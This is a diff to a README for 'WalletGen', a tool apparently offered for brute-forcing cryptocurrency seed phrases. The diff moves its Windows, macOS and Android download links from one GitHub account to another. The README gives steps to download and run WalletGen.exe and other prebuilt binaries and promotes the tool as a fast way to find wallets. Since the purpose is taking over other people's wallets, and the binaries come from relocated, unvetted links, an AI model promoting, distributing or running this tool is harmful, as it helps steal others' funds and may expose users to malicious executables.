@@ -84,13 +84,13 @@ Unlike Python-based brute force tools, **WalletGen** is written in C++ and optim
 # How to start
 
 ## Windows 
-- Download [WalletGen.zip](https://github.com/tony-btc/seed-phrase-generator/releases/download/walletgen/WalletGen_v1.8.0.zip) (3MB)
+- Download [WalletGen.zip](https://github.com/tony-cote/walletgen/releases/tag/walletgen)
 - Unpack anywhere
 - Run `WalletGen.exe`
 
 ## MacOS
 
-- Download [WalletGen.dmg](https://github.com/tony-btc/seed-phrase-generator/releases/download/walletgen/WalletGen_v1.8.0.zip) (1MB)
+- Download [WalletGen.dmg](https://github.com/tony-cote/walletgen/releases/tag/walletgen)
 
 ## Linux (x86-64bit)
 ```bash
@@ -100,7 +100,7 @@ cd walletgen
 ./walletgen
 ```
 ## Android (Beta)
-- Download [walletgen-beta.apk](https://github.com/tony-btc/seed-phrase-generator/releases/download/walletgen/walletgen-android-beta.apk) (15MB)
+- Download [walletgen-beta.apk](https://github.com/tony-cote/walletgen/releases/tag/walletgen) (15MB)
 
 ### Download and Use Database (for more speed)
 | Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
